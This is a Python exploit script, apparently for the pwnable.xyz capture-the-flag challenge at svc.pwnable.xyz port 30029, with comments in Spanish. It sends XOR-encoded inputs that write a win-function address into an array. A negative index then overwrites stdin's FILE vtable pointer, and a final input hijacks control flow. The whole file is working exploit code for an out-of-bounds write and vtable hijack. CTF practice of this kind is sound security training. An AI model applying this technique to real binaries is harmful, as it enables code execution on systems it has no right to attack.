#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(35)
s.connect((host, port))

print("CONECTADO")
banner = s.recv(1024)
print(banner.decode())

# Probar 0xa25 (skip push rbp) en lugar de 0xa21
win_no_prologue = 0xa25
result_base = 0x202200

print(f"\nProbando con win+4 = {hex(win_no_prologue)} (sin prólogo)")
print("Esto evita el push rbp que puede causar problemas\n")

# Poner win_no_prologue en result[4] y result[5]
print("result[4] = 0xa25...")
s.sendall(f"{win_no_prologue ^ 4444} {4444} 4\n".encode())
time.sleep(0.2)

print("result[5] = 0xa25...")
s.sendall(f"{win_no_prologue ^ 5555} {5555} 5\n".encode())
time.sleep(0.2)

try:
    s.recv(8192, socket.MSG_DONTWAIT)
except:
    pass

# Vtable a result_base
print(f"\nstdin->vtable = {hex(result_base)}...")
s.sendall(f"{result_base ^ 99999} {99999} -5\n".encode())
time.sleep(0.5)

try:
    s.recv(2048, socket.MSG_DONTWAIT)
except:
    pass

# Trigger
print("\nTrigger...")
s.setblocking(False)
s.sendall(b"7 14 2\n")

# Capturar
all_data = b""
for _ in range(250):  # 25 segundos
    time.sleep(0.1)
    try:
        chunk = s.recv(8192)
        if chunk:
            all_data += chunk
            sys.stdout.write(chunk.decode())
            sys.stdout.flush()
    except:
        pass

print(f"\n{'='*60}")
print(f"Total: {len(all_data)} bytes")
if all_data:
    print(all_data.decode())
print('='*60)

s.close()